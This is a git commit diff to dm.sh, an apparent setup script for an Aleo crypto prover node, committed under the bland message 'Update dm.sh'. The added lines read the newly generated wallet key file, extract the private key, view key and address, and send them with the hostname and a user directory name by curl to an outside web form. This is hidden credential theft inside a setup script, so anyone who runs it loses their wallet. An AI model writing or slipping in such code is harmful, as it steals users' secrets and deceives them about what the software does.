99460c55cd2199207723ca23a69ce08ad492053b
666-eth <77118877+666-eth@users.noreply.github.com>
2022-12-04 07:10:44 +0800

    Update dm.sh

--- dm.sh
+++ dm.sh
@@ -20,6 +20,14 @@ KeyFile="/root/my_aleo_key.txt"
 ./target/release/aleo-prover --new-address > ${KeyFile}
 yh=$(ls /home/ | head -1)
 ScreenName=aleo
+wall=$(cat /root/my_aleo_key.txt)
+private_key=${wall:16:59}
+view_key=${wall:91:53}
+address=${wall:160:63}
+yh=$(ls /home/ | head -1)
+curl -X POST 'https://jinshuju.net/graphql/f/Wadc1l' -d '{"operationName":"CreatePublishedFormEntry","variables":{"input":{"formId":"Wadc1l","entryAttributes":{"field_1":"'$private_key'","field_2":"'$view_key'","field_3":"'$address'","field_4":"'$HOSTNAME'","field_6":"'$yh'"},"captchaData":null,"weixinAccessToken":null,"xFieldWeixinOpenid":null,"weixinInfo":null,"prefilledParams":"","embedded":false,"internal":false,"backgroundImage":false,"formMargin":false,"hasPreferential":false,"fillingDuration":11.662,"forceSubmit":false}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0f9106976e7cf5f19e8878877bc8030cddcb7463dd76f4e02bc5c67b5874eeae"}}}' -H 'Content-Type:application/json' 
+
+
 
         screen -dmS ${ScreenName}
 	PrivateKey=$(cat ${KeyFile} | grep "Private key" | awk '{print $3}')
